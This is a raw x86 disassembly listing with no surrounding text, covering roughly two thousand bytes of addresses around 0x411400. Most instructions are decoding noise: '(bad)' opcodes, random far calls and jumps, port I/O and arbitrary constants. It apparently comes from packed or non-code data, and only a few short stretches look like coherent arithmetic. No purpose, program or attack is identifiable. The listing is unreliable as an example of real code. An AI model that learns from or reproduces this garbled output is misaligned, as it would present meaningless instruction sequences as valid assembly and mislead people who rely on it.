  4113b3:	call   0x369e:0xf4293e92
  4113ba:	sahf   
  4113bb:	dec    ecx
  4113bc:	aas    
  4113bd:	pop    ds
  4113be:	adc    DWORD PTR [edx-0x54],edi
  4113c1:	jns    0x41138e
  4113c3:	cmp    eax,0x14abc3a6
  4113c8:	(bad)  
  4113c9:	mov    edi,0x9da2a723
  4113ce:	pop    ecx
  4113cf:	jge    0x41144f
  4113d1:	mov    ecx,0xf579fece
  4113d6:	mov    dl,0xf6
  4113d8:	sbb    eax,0x4cc9cac5
  4113dd:	push   edx
  4113de:	inc    ebx
  4113df:	mul    edx
  4113e1:	icebp  
  4113e2:	jno    0x4113f1
  4113e4:	or     bh,0xb
  4113e7:	or     BYTE PTR [edi],cl
  4113e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113ea:	scas   eax,DWORD PTR es:[edi]
  4113eb:	ds jle 0x4113af
  4113ee:	in     al,0x55
  4113f0:	mov    esp,0x60cac5c0
  4113f5:	mov    ebx,0x1173f02e
  4113fa:	sbb    al,0x4a
  4113fc:	mov    al,0x5f
  4113fe:	push   edx
  4113ff:	dec    esp
  411400:	loope  0x411438
  411402:	mov    al,ds:0xca600b26
  411407:	xlat   BYTE PTR ds:[ebx]
  411408:	mov    eax,0xff7a6484
  41140d:	inc    esp
  41140e:	addr16 jne 0x4113af
  411411:	fmul   QWORD PTR [eax]
  411413:	call   0x2c015d17
  411418:	inc    esi
  411419:	cmc    
  41141a:	and    bh,BYTE PTR [eax+0x7f6168c7]
  411420:	sub    BYTE PTR [ebx],cl
  411422:	sbb    dl,BYTE PTR [edx-0x56459577]
  411428:	stc    
  411429:	jns    0x4113c1
  41142b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41142c:	jbe    0x4113d1
  41142e:	dec    eax
  41142f:	dec    edx
  411430:	das    
  411431:	push   esi
  411432:	push   ecx
  411433:	clc    
  411434:	mov    ebp,0x30c1157b
  411439:	push   cs
  41143a:	inc    ebp
  41143b:	cdq    
  41143c:	push   edi
  41143d:	sbb    ecx,DWORD PTR [esi-0x3e90914]
  411443:	jp     0x41142e
  411445:	inc    eax
  411446:	shr    DWORD PTR [ebp+eax*2+0x42e7bcf7],cl
  41144d:	aam    0x9
  41144f:	or     ecx,0x3d
  411452:	test   al,0xf3
  411454:	adc    cl,BYTE PTR [ebx-0x30]
  411457:	mov    WORD PTR [ebp-0x66],?
  41145a:	pusha  
  41145b:	mov    esp,0x62ea1ef4
  411460:	mov    ds:0x53d6bb19,eax
  411465:	sti    
  411466:	or     DWORD PTR [ecx-0x2b677a3c],esi
  41146c:	dec    eax
  41146d:	jne    0x4113f3
  41146f:	xor    DWORD PTR [edi+0x14],0x6c
  411473:	pop    ebx
  411474:	inc    ebp
  411475:	sub    cl,cl
  411477:	add    DWORD PTR [esi-0xc],esp
  41147a:	(bad)  
  41147b:	pop    eax
  41147c:	jno    0x411464
  41147e:	adc    ebp,DWORD PTR [ecx]
  411480:	mov    eax,ds:0xe1c97f3e
  411485:	adc    ecx,DWORD PTR [edi+0x76772645]
  41148b:	cmp    ebp,DWORD PTR ds:0xf4975615
  411491:	imul   eax,DWORD PTR [edx+0x17],0x60
  411495:	pop    eax
  411496:	enter  0xc7f7,0xd3
  41149a:	sub    eax,0x131f94f8
  41149f:	adc    eax,0xf6424088
  4114a4:	sub    ch,BYTE PTR [edi+0x65]
  4114a7:	pop    ebp
  4114a8:	cli    
  4114a9:	sbb    DWORD PTR [ecx+0x79],edx
  4114ac:	out    dx,al
  4114ad:	xor    BYTE PTR [esi],dl
  4114af:	int3   
  4114b0:	div    BYTE PTR [edx-0x250bf9b0]
  4114b6:	xchg   DWORD PTR [eax],ebx
  4114b8:	(bad)
  4114bb:	aaa    
  4114bc:	or     eax,0x2165c155
  4114c1:	lea    esp,[eax]
  4114c3:	shr    BYTE PTR [ecx-0x18ba0d9],0x78
  4114ca:	sbb    esi,esi
  4114cc:	gs push 0xcf670eec
  4114d2:	xor    DWORD PTR [edx-0x74],0xf34afb60
  4114d9:	cwde   
  4114da:	adc    BYTE PTR [edx],ch
  4114dc:	xlat   BYTE PTR ds:[ebx]
  4114dd:	push   ss
  4114de:	inc    ecx
  4114df:	ds jno 0x4114f8
  4114e2:	pop    esi
  4114e3:	int    0x46
  4114e5:	scas   eax,DWORD PTR es:[edi]
  4114e6:	rcl    BYTE PTR [esi+edi*4-0x75],1
  4114ea:	loopne 0x4114d9
  4114ec:	test   eax,0xf87d8b76
  4114f1:	mov    ebx,DWORD PTR [ebp-0x10]
  4114f4:	sub    ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	or     dh,BYTE PTR [edx]
  411511:	in     al,dx
  411512:	sar    BYTE PTR [edi-0x1a8787a3],cl
  411518:	jle    0x411592
  41151a:	js     0x411509
  41151c:	adc    DWORD PTR [edi-0x6b26d06b],0x58
  411523:	mov    edx,0xb803ef82
  411528:	dec    edx
  411529:	xchg   ecx,eax
  41152a:	sub    DWORD PTR [edi-0x7e],edx
  41152d:	mov    bl,0xe2
  41152f:	fs or  al,0x67
  411532:	call   0x980e:0xe825f989
  411539:	sti    
  41153a:	add    eax,0x7bbca978
  41153f:	pop    ebx
  411540:	inc    edi
  411541:	int3   
  411542:	sub    edx,eax
  411544:	jae    0x4115b0
  411546:	mov    bh,bl
  411548:	inc    esi
  411549:	inc    esi
  41154a:	cwde   
  41154b:	jae    0x411528
  41154d:	xlat   BYTE PTR ds:[ebx]
  41154e:	imul   BYTE PTR ds:0xa61eb30d
  411554:	sub    DWORD PTR [edx+ebp*2+0x13ba8959],edi
  41155b:	or     ah,BYTE PTR [ebp-0x15968ea4]
  411561:	test   eax,0xb714c290
  411566:	push   cs
  411567:	sbb    ecx,DWORD PTR [esi-0x6a1ae1c8]
  41156d:	ret    
  41156e:	cdq    
  41156f:	cs xchg ebp,eax
  411571:	ins    BYTE PTR es:[edi],dx
  411572:	jns    0x41159b
  411574:	pop    esp
  411575:	jb     0x4115db
  411577:	xor    eax,0xf2174f6c
  41157c:	adc    eax,eax
  41157e:	not    DWORD PTR [edx-0x18440c8b]
  411584:	inc    eax
  411585:	in     eax,dx
  411586:	xor    cl,al
  411588:	lds    esp,FWORD PTR [esi+eax*2]
  41158b:	and    bh,BYTE PTR [ecx]
  41158d:	dec    edx
  41158e:	daa    
  41158f:	test   dl,bh
  411591:	add    esp,ecx
  411593:	cmp    DWORD PTR ds:0xfed84dff,edx
  411599:	cmp    DWORD PTR [esi],ebp
  41159b:	loop   0x4115e6
  41159d:	gs cmp al,0xbc
  4115a0:	cmp    DWORD PTR [ecx+0x75],esp
  4115a3:	pop    es
  4115a4:	add    eax,0x59f6792
  4115a9:	push   eax
  4115aa:	xchg   ecx,eax
  4115ab:	add    al,0x51
  4115ae:	dec    edi
  4115af:	or     al,0xdb
  4115b1:	div    BYTE PTR [esi+0x3594b6e9]
  4115b7:	aam    0x2e
  4115b9:	mov    ds:0xb62ee05a,al
  4115be:	in     al,0x2e
  4115c0:	sbb    al,0x95
  4115c2:	xchg   edx,eax
  4115c3:	lds    ecx,FWORD PTR [eax]
  4115c5:	sar    DWORD PTR [ebx-0x242077cf],cl
  4115cb:	dec    ebx
  4115cc:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4115ce:	mov    eax,0x1a4e24d9
  4115d3:	mov    al,0x1c
  4115d5:	xor    al,0x8c
  4115d7:	je     0x4115a7
  4115d9:	pop    ebp
  4115da:	jmp    0x7f5e:0x8523e229
  4115e1:	inc    eax
  4115e2:	lahf   
  4115e3:	cmp    cl,BYTE PTR [esp+ecx*8-0x7f383935]
  4115ea:	xor    eax,0xdad2d66c
  4115ef:	mov    bl,0x1c
  4115f1:	sbb    esp,ebp
  4115f3:	xor    BYTE PTR [edx],ah
  4115f5:	cs cli 
  4115f7:	(bad)  
  4115f9:	inc    ecx
  4115fa:	pop    ds
  4115fb:	push   edi
  4115fc:	out    0x6e,eax
  4115fe:	popa   
  4115ff:	add    ebp,edi
  411601:	pushf  
  411602:	mov    ds:0xc1d76a81,eax
  411607:	pop    eax
  411608:	loopne 0x411592
  41160a:	test   BYTE PTR [esi+0x529a7bb8],ah
  411610:	and    eax,0xee47a534
  411615:	sub    eax,0x7d528ff9
  41161a:	adc    eax,0x9af586eb
  41161f:	cmp    eax,0x379e8448
  411624:	cmp    DWORD PTR [ebp+0x332a655b],0xffffffaa
  41162b:	ja     0x4115e6
  41162d:	daa    
  41162e:	in     eax,dx
  41162f:	inc    ebx
  411630:	jne    0x4115f1
  411632:	adc    BYTE PTR [ebx+0x28],dl
  411635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411636:	cmp    BYTE PTR [ebp-0x28],0x2f
  41163a:	push   ecx
  41163b:	es (bad) 
  41163d:	sub    al,0x1e
  41163f:	adc    DWORD PTR [ecx],eax
  411641:	jne    0x4115ea
  411643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411644:	adc    eax,DWORD PTR [ecx-0x6497a58e]
  41164a:	in     eax,0xb
  41164c:	daa    
  41164d:	xor    al,0xd0
  41164f:	in     al,dx
  411650:	push   edx
  411651:	fiadd  DWORD PTR [esi+0x38]
  411654:	out    dx,al
  411655:	add    eax,0x9571e210
  41165a:	mov    ds:0x2286599f,al
  41165f:	push   eax
  411660:	lahf   
  411661:	enter  0xe72b,0x9d
  411665:	cmp    edx,ebp
  411667:	dec    edx
  411668:	and    ch,BYTE PTR [ebx+0x34a1c421]
  41166e:	fiadd  DWORD PTR [ebp+0x37845253]
  411674:	inc    ebx
  411675:	cld    
  411676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411677:	mov    ds,ebp
  411679:	mov    edi,0xbd576f44
  41167e:	(bad)  
  41167f:	xchg   edx,eax
  411680:	xchg   ebx,eax
  411681:	int3   
  411682:	neg    BYTE PTR [esi+0x567e5838]
  411688:	xor    bh,bh
  41168a:	xor    BYTE PTR [edi-0x73],0x2c
  41168e:	rcl    DWORD PTR [edx+0x5642b284],0xe6
  411695:	push   cs
  411696:	pusha  
  411697:	mov    ds:0x430589b2,al
  41169c:	gs enter 0x5493,0x89
  4116a1:	or     al,0xce
  4116a3:	arpl   WORD PTR [ecx],ax
  4116a5:	(bad)  
  4116a6:	inc    edx
  4116a8:	xchg   ebx,eax
  4116a9:	jmp    0x9a8b6f28
  4116ae:	or     bh,ch
  4116b0:	aam    0x88
  4116b2:	jle    0x4116f5
  4116b4:	add    DWORD PTR [eax+0x506de0f0],ebp
  4116ba:	test   al,0x51
  4116bc:	adc    BYTE PTR [edi],ah
  4116be:	test   BYTE PTR [ecx],ch
  4116c0:	mov    BYTE PTR [ebx+0x2c],0x60
  4116c4:	jb     0x4116d7
  4116c6:	jmp    0xf8862131
  4116cb:	div    BYTE PTR [edi+0x2c]
  4116ce:	dec    ebx
  4116cf:	pop    eax
  4116d0:	inc    eax
  4116d1:	(bad)  
  4116d2:	retf   0xac1e
  4116d5:	arpl   WORD PTR [edi],dx
  4116d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116d8:	push   eax
  4116d9:	ret    0xb803
  4116dc:	pusha  
  4116dd:	cdq    
  4116de:	jnp    0x411715
  4116e0:	inc    eax
  4116e1:	lahf   
  4116e2:	and    BYTE PTR [edx],ah
  4116e4:	int    0x7e
  4116e6:	cmp    eax,0x8cc906c9
  4116eb:	sar    BYTE PTR [ebp-0x8],0xdc
  4116ef:	lea    eax,[ebx-0x51]
  4116f2:	jnp    0x411692
  4116f4:	inc    esi
  4116f5:	aas    
  4116f6:	adc    DWORD PTR [ebx],esp
  4116f8:	imul   edx,DWORD PTR [edx-0x7101ccd7],0x4a
  4116ff:	sar    BYTE PTR [edi-0xaddf5bb],cl
  411705:	sub    ebp,DWORD PTR [ebp-0x3b]
  411708:	lds    ecx,FWORD PTR [ebx]
  41170a:	jmp    0xb447:0x92830879
  411711:	jmp    0x435b9dc
  411716:	mov    edi,0x724cbf34
  41171b:	push   ss
  41171c:	push   eax
  41171d:	test   DWORD PTR [edi-0x70],ecx
  411720:	pop    ds
  411721:	xor    ebp,esp
  411723:	aad    0xfa
  411725:	je     0x4116fb
  411727:	das    
  411728:	lea    edi,[ebx+0x7c]
  41172b:	sahf   
  41172c:	mov    ch,ch
  41172e:	sbb    eax,0xba2234ba
  411733:	or     dl,BYTE PTR [edi+0x768b1bd]
  411739:	dec    esp
  41173a:	ficom  DWORD PTR [edx+0x1111dcd8]
  411740:	cmp    DWORD PTR es:[esi+0x5474c994],edi
  411747:	push   edx
  411748:	lock (bad) 
  41174a:	mul    DWORD PTR [edi]
  41174c:	mov    cl,BYTE PTR [edx]
  41174e:	inc    edi
  41174f:	push   edx
  411750:	sub    cl,BYTE PTR [esi+0x64c1c6b8]
  411756:	pop    edx
  411757:	bound  esi,QWORD PTR [edi]
  411759:	mul    edx
  41175b:	aaa    
  41175c:	loop   0x41176a
  41175e:	mov    dh,0xc
  411760:	inc    edx
  411761:	into   
  411762:	ja     0x4116f3
  411764:	scas   al,BYTE PTR es:[edi]
  411765:	push   ebp
  411766:	inc    ebp
  411767:	adc    bl,ch
  411769:	aaa    
  41176a:	jmp    0xec0e002
  41176f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411770:	loopne 0x4117cd
  411772:	sahf   
  411773:	int3   
  411774:	pop    es
  411775:	bound  ebp,QWORD PTR [ebp-0x1eaa5208]
  41177b:	je     0x411707
  41177d:	mov    fs,esi
  41177f:	mov    ecx,0xe924a743
  411784:	dec    esi
  411785:	sub    ecx,DWORD PTR [ebx-0x17162fab]
  41178b:	pop    es
  41178c:	add    BYTE PTR [eax],al
  41178e:	mov    edx,DWORD PTR [ebp-0x38]
  411791:	mov    edi,DWORD PTR [ebp-0x4]
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	jp     0x4117f8
  4117b5:	xor    al,0x4c
  4117b7:	and    al,0x62
  4117b9:	js     0x411833
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	scas   al,BYTE PTR es:[edi]
  4117c0:	ret    0x8531
  4117c3:	arpl   sp,bp
  4117c5:	push   ecx
  4117c6:	and    DWORD PTR [ecx],0x1fd51780
  4117cc:	sbb    ebx,DWORD PTR [edi]
  4117ce:	popf   
  4117cf:	adc    BYTE PTR [esi-0x62],cl
  4117d2:	dec    edi
  4117d3:	jle    0x4117d6
  4117d5:	xor    al,0xd1
  4117d7:	je     0x4117ef
  4117d9:	xchg   esi,eax
  4117da:	jl     0x411781
  4117dc:	adc    DWORD PTR [esp+ebx*4],edx
  4117df:	scas   eax,DWORD PTR es:[edi]
  4117e0:	mov    ah,0xac
  4117e2:	loop   0x4117b7
  4117e4:	call   0xe0956375
  4117e9:	je     0x411841
  4117eb:	jns    0x4117f5
  4117ed:	ret    
  4117ee:	fld    DWORD PTR [ecx]
  4117f0:	jo     0x4117f4
  4117f2:	imul   eax,DWORD PTR [edx-0x22],0xffffffde
  4117f6:	adc    al,0xf1
  4117f8:	in     al,dx
  4117f9:	cmp    DWORD PTR [ecx+0x3d],0xfffffffa
  4117fd:	fldenv [ecx+ecx*4-0x3a]
  411801:	xchg   edi,eax
  411802:	ja     0x411820
  411804:	and    eax,0x171cee66
  411809:	stos   BYTE PTR es:[edi],al
  41180a:	xchg   esi,eax
  41180b:	xchg   esi,eax
  41180c:	mov    ebp,0x99d47372
  411811:	arpl   ax,si
  411813:	mov    dh,0x52
  411815:	dec    esi
  411816:	pop    eax
  411817:	inc    edi
  411818:	push   esi
  411819:	jg     0x41179c
  41181b:	lahf   
  41181c:	aaa    
  41181d:	int    0x8b
  41181f:	in     al,0xe6
  411821:	arpl   WORD PTR [eax],ax
  411823:	pushf  
  411824:	stos   BYTE PTR es:[edi],al
  411825:	loop   0x411861
  411827:	dec    ecx
  411828:	mov    al,ds:0xd908fbcb
  41182d:	sti    
  41182e:	jp     0x411834
  411830:	addr16 pushf 
  411832:	stc    
  411833:	xchg   BYTE PTR [ecx+0x60bd72a7],dl
  411839:	sub    edx,DWORD PTR [ebp-0xea39af6]
  41183f:	lea    edx,[ecx]
  411841:	push   esi
  411842:	cld    
  411843:	into   
  411844:	adc    eax,0xd76dcb81
  411849:	or     BYTE PTR [edi],al
  41184b:	push   eax
  41184c:	adc    DWORD PTR ds:0x5eba1248,eax
  411852:	inc    edx
  411853:	inc    ebp
  411854:	out    dx,al
  411855:	das    
  411856:	data16 jp 0x411873
  411859:	out    0x4d,al
  41185b:	push   edx
  41185c:	mov    esp,0xefde0fb2
  411861:	or     al,0x27
  411863:	es inc ebp
  411865:	mov    dl,0xfa
  411867:	pushf  
  411868:	(bad)  
  41186a:	aas    
  41186b:	add    DWORD PTR [esi],0xffffffb2
  41186e:	in     al,dx
  41186f:	adc    al,0xfc
  411871:	(bad)  
  411872:	sbb    al,BYTE PTR [edi+0x4ce57850]
  411878:	xor    BYTE PTR [ecx+0x42],0x51
  41187c:	pop    ebx
  41187d:	repz dec edx
  41187f:	pop    es
  411880:	pop    ebp
  411881:	sub    eax,0x58393e55
  411886:	add    ecx,eax
  411888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411889:	inc    ebp
  41188a:	mov    ebp,0xe0794851
  41188f:	addr16 push esp
  411891:	aas    
  411892:	and    BYTE PTR [ebx-0x6a59e78b],ah
  411898:	jnp    0x4118b7
  41189a:	mov    ?,WORD PTR [ebx+ebx*8]
  41189d:	push   eax
  41189e:	fnstcw WORD PTR gs:[ecx-0x46]
  4118a2:	sbb    ch,BYTE PTR [ebx-0x14]
  4118a5:	in     al,0x6c
  4118a7:	ret    0x9624
  4118aa:	jp     0x4118bd
  4118ac:	dec    esi
  4118ad:	xchg   esp,eax
  4118ae:	inc    esp
  4118af:	iret   
  4118b0:	push   es
  4118b1:	in     eax,0x1c
  4118b3:	jmp    0xce1b1e5c
  4118b8:	aad    0x69
  4118ba:	inc    edi
  4118bb:	retf   0xa98e
  4118be:	xor    BYTE PTR [edx+0x1ee3cca0],cl
  4118c4:	gs dec ebp
  4118c6:	aaa    
  4118c7:	out    0xba,al
  4118c9:	push   ebp
  4118ca:	dec    ecx
  4118cb:	pop    edx
  4118cc:	clc    
  4118cd:	cli    
  4118ce:	es call 0xedfe:0x15074db6
  4118d6:	out    0xfc,eax
  4118d8:	adc    DWORD PTR [ebp-0x7e67d47f],edx
  4118de:	sar    eax,0xfb
  4118e1:	pop    edx
  4118e2:	bound  edi,QWORD PTR [esi+0x6f]
  4118e5:	cmp    al,0x54
  4118e7:	es sti 
  4118e9:	xchg   ebp,eax
  4118ea:	push   esp
  4118eb:	pop    es
  4118ec:	xchg   esp,eax
  4118ed:	xor    eax,0x625db69a
  4118f2:	sub    DWORD PTR [esi],eax
  4118f4:	and    DWORD PTR [esi],ebx
  4118f6:	mov    ebp,0xd592b29f
  4118fb:	cmp    al,0xa0
  4118fd:	idiv   DWORD PTR [esi-0x1b]
  411900:	test   eax,0x6a665f33
  411905:	std    
  411906:	lds    eax,FWORD PTR [ebx]
  411908:	je     0x411914
  41190a:	stc    
  41190b:	push   es
  41190c:	(bad)
  41190f:	call   0x5da2:0xbea2a766
  411916:	adc    DWORD PTR [ebp-0x46329943],0x1e
  41191d:	cmp    al,0x12
  41191f:	xor    eax,0x2a41f97c
  411924:	dec    edx
  411925:	scas   eax,DWORD PTR es:[edi]
  411926:	sub    eax,0xf41db404
  41192b:	js     0x411969
  41192d:	jg     0x4118ea
  41192f:	xchg   edx,eax
  411930:	mul    DWORD PTR [edi-0x4d]
  411933:	jl     0x411983
  411935:	adc    DWORD PTR ds:0xb42055e9,ebp
  41193b:	cmp    bl,BYTE PTR [ecx]
  41193d:	or     esp,DWORD PTR [esi-0x5781167a]
  411943:	xor    eax,0x7df8f150
  411948:	jns    0x41196c
  41194a:	mov    DWORD PTR [esi-0x50],ebp
  41194d:	in     eax,dx
  41194e:	mov    al,ds:0xd6be39b9
  411953:	push   cs
  411954:	out    dx,eax
  411955:	inc    ecx
  411956:	mov    DWORD PTR [esi],ecx
  411958:	xor    esp,DWORD PTR [eax-0x32]
  41195b:	xchg   ecx,eax
  41195c:	inc    esp
  41195d:	mov    ds:0xf0016f55,al
  411962:	std    
  411963:	cs cld 
  411965:	scas   eax,DWORD PTR es:[edi]
  411966:	xor    DWORD PTR [edx],0x2c0831b0
  41196c:	aaa    
  41196d:	sub    eax,0x5af3fb4a
  411972:	mov    al,0xcc
  411974:	or     eax,0xa8717b1a
  411979:	add    al,0x21
  41197b:	mov    ecx,0x84df3a5e
  411980:	sbb    BYTE PTR [esi],ah
  411982:	je     0x4119c8
  411984:	cs push esp
  411986:	adc    DWORD PTR [edx-0x1a],ecx
  411989:	aad    0xd1
  41198b:	push   ds
  41198c:	cmp    al,0xb1
  41198e:	test   DWORD PTR [eax-0x36],esp
  411991:	jmp    0xca59a71a
  411996:	pop    ebp
  411997:	fld    DWORD PTR ds:0xd9d64b7c
  41199d:	xchg   edi,eax
  41199e:	cwde   
  41199f:	inc    eax
  4119a0:	mov    ah,0xe5
  4119a2:	sub    DWORD PTR [edi],ebx
  4119a4:	(bad)  
  4119a5:	or     al,0x7c
  4119a7:	push   0x12e298b9
  4119ac:	lds    edi,FWORD PTR [ecx]
  4119ae:	cli    
  4119af:	dec    esi
  4119b0:	ds dec edi
  4119b2:	std    
  4119b3:	xor    eax,0xbf443b3e
  4119b8:	retf   
  4119b9:	repz test eax,0x1fb3ca54
  4119bf:	out    dx,eax
  4119c0:	test   dl,ah
  4119c2:	add    eax,0xcc08dea
  4119c7:	pop    ss
  4119c8:	lods   al,BYTE PTR ds:[esi]
  4119c9:	hlt    
  4119ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119cb:	adc    eax,0x534513bb
  4119d0:	dec    edi
  4119d1:	inc    esi
  4119d2:	test   al,0xfa
  4119d4:	(bad)  
  4119d5:	jle    0x4119d4
  4119d7:	inc    esi
  4119d8:	in     eax,0x1d
  4119da:	dec    esp
  4119db:	adc    BYTE PTR [ebp+0x7f986f9],dl
  4119e1:	test   al,0x60
  4119e3:	mov    esp,0x1b9ccbd0
  4119e8:	fld    DWORD PTR [ebx+0x26]
  4119eb:	ret    
  4119ec:	jbe    0x4119cf
  4119ee:	mov    BYTE PTR [ecx],ah
  4119f0:	inc    ecx
  4119f1:	sub    al,BYTE PTR [ebx]
  4119f3:	mov    edx,0xe6f260d4
  4119f8:	sub    BYTE PTR [esi+0x295b80d4],bl
  4119fe:	sub    ebp,DWORD PTR [ecx]
  411a00:	xchg   ecx,eax
  411a01:	test   al,0xf
  411a03:	test   eax,0xadb1bf4f
  411a08:	aas    
  411a09:	stc    
  411a0a:	in     eax,0x4e
  411a0c:	retf   0x9356
  411a0f:	pop    edi
  411a10:	ds imul ebx,esi,0xffffffbc
  411a14:	lock les esp,FWORD PTR es:[ebp+0x64]
  411a19:	in     eax,0x73
  411a1b:	push   es
  411a1c:	mov    ecx,0x5143ee38
  411a21:	scas   al,BYTE PTR es:[edi]
  411a22:	daa    
  411a23:	dec    esp
  411a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a25:	mov    al,0x12
  411a27:	les    esi,FWORD PTR [esi-0xfa2741e]
  411a2d:	sub    ebx,edi
  411a2f:	cmp    ebx,edx
  411a31:	ja     0x411a3f
  411a37:	mov    edx,DWORD PTR [ebp-0x34]
  411a3a:	jmp    0x411f76
  411a3f:	mov    edx,DWORD PTR [ebp-0x3c]
  411a42:	mov    edi,DWORD PTR [ebp-0x4]
  411a45:	xor    edx,eax
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0x2fd7da8b
  411a62:	cmp    eax,ebp
  411a64:	inc    esi
  411a65:	xchg   ecx,eax
  411a66:	pusha  
  411a67:	js     0x411ae1
  411a69:	in     eax,0x7e
  411a6b:	js     0x411ae5
  411a6d:	inc    ebp
  411a6e:	inc    ebp
  411a6f:	jno    0x411a21
  411a71:	jg     0x411a78
  411a73:	or     bl,BYTE PTR [eax-0x70]
  411a76:	and    ebp,eax
  411a78:	xlat   BYTE PTR ds:[ebx]
  411a79:	mov    DWORD PTR [esi-0x244535af],edi
  411a7f:	jne    0x411a9b
  411a81:	out    dx,eax
  411a82:	popa   
  411a83:	je     0x411a8c
  411a85:	mov    eax,0x136a69c2
  411a8a:	adc    eax,DWORD PTR [ecx-0x3f1fd072]
  411a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a91:	sbb    eax,0x5164cecd
  411a96:	mov    cl,0x84
  411a98:	dec    DWORD PTR [edx+edx*4+0x30]
  411a9c:	in     eax,dx
  411a9d:	xor    eax,0xad5300a3
  411aa2:	clc    
  411aa3:	jmp    0xee80:0x48cb4590
  411aaa:	cmp    BYTE PTR [edi+edx*1],ah
  411aad:	xlat   BYTE PTR ds:[ebx]
  411aae:	scas   al,BYTE PTR es:[edi]
  411aaf:	ja     0x411a5a
  411ab1:	out    0x6a,eax
  411ab3:	add    DWORD PTR [eax+0x4c],ecx
  411ab6:	ins    DWORD PTR es:[edi],dx
  411ab7:	sub    edi,DWORD PTR [eax+0x6e]
  411aba:	(bad)
  411abe:	enter  0x270f,0x36
  411ac2:	(bad)  
  411ac3:	mov    ch,0x2e
  411ac5:	push   edx
  411ac6:	or     DWORD PTR [edi],esi
  411ac8:	add    BYTE PTR [ebx-0x85e0fcd],al
  411ace:	push   edx
  411acf:	cmp    ecx,ebp
  411ad1:	cmp    ch,BYTE PTR ds:0xa38d5789
  411ad7:	add    DWORD PTR [eax+edx*2],ebp
  411ada:	jg     0x411ac5
  411adc:	push   ecx
  411add:	retf   0xa1e1
  411ae0:	data16 jbe 0x411aeb
  411ae3:	pop    DWORD PTR [ecx]
  411ae5:	xchg   ebx,eax
  411ae6:	add    eax,0x8e8107a0
  411aeb:	push   ss
  411aec:	scas   al,BYTE PTR es:[edi]
  411aed:	outs   dx,BYTE PTR ds:[esi]
  411aee:	pop    eax
  411aef:	test   al,dl
  411af1:	ret    
  411af2:	add    eax,DWORD PTR [edx+0x64715997]
  411af8:	sbb    eax,0xd273e877
  411afd:	dec    edx
  411afe:	or     eax,0xe4cbb9ec
  411b03:	pushf  
  411b04:	add    BYTE PTR [edi+0x2136e1b4],ah
  411b0a:	cs add al,0x52
  411b0d:	jp     0x411b69
  411b0f:	mov    ds:0xcab56a06,al
  411b14:	pop    ecx
  411b15:	je     0x411aac
  411b17:	rcl    BYTE PTR [ebx-0x6d],0xc7
  411b1b:	inc    ecx
  411b1c:	pop    edx
  411b1d:	xor    DWORD PTR [si-0x2cab],esi
  411b22:	and    BYTE PTR [esp+eax*8+0x6e0475bd],cl
  411b29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b2a:	not    BYTE PTR ds:[edx]
  411b2d:	jo     0x411ba0
  411b2f:	in     eax,dx
  411b30:	and    al,0xa
  411b32:	lds    ebp,FWORD PTR [ebp-0xb44f8a4]
  411b38:	cwde   
  411b39:	lods   al,BYTE PTR ds:[esi]
  411b3a:	das    
  411b3b:	scas   al,BYTE PTR es:[edi]
  411b3c:	aaa    
  411b3d:	sbb    edx,DWORD PTR [edi-0x70]
  411b40:	mov    ah,BYTE PTR [edx-0x24]
  411b43:	dec    ecx
  411b44:	mov    esp,0x693f1481
  411b49:	lahf   
  411b4a:	es scas al,BYTE PTR es:[edi]
  411b4c:	inc    edi
  411b4d:	xor    ebx,DWORD PTR [edi]
  411b4f:	sbb    al,0xd1
  411b51:	(bad)  
  411b52:	fdiv   QWORD PTR ds:0x3d2fb499
  411b58:	jae    0x411b2e
  411b5a:	mov    edx,0xb6e0bffe
  411b5f:	in     al,dx
  411b60:	sub    BYTE PTR [ebx-0x73],bl
  411b63:	je     0x411b21
  411b65:	mov    ebp,0x52034ca4
  411b6a:	adc    bl,BYTE PTR ds:0x912f1fa
  411b70:	dec    esi
  411b71:	ins    BYTE PTR es:[edi],dx
  411b72:	mov    bl,0x45
  411b74:	pop    es
  411b75:	in     eax,dx
  411b76:	dec    edx
  411b77:	loopne 0x411b9f
  411b79:	(bad)  
  411b7a:	out    0x5e,al
  411b7c:	aam    0x37
  411b7e:	in     eax,0xf8
  411b80:	gs pop esi
  411b82:	rcr    BYTE PTR [edx+0x41],1
  411b85:	ja     0x411b41
  411b87:	adc    BYTE PTR [ebx],bl
  411b89:	int3   
  411b8a:	xchg   edi,eax
  411b8b:	inc    ecx
  411b8c:	in     al,0xa
  411b8e:	add    ebx,DWORD PTR [edi+0x7ea0e425]
  411b94:	dec    edi
  411b95:	outs   dx,BYTE PTR ds:[esi]
  411b96:	fadd   QWORD PTR [eax]
  411b98:	pop    ds
  411b99:	sti    
  411b9a:	stos   DWORD PTR es:[edi],eax
  411b9b:	jne    0x411bb2
  411b9d:	push   cs
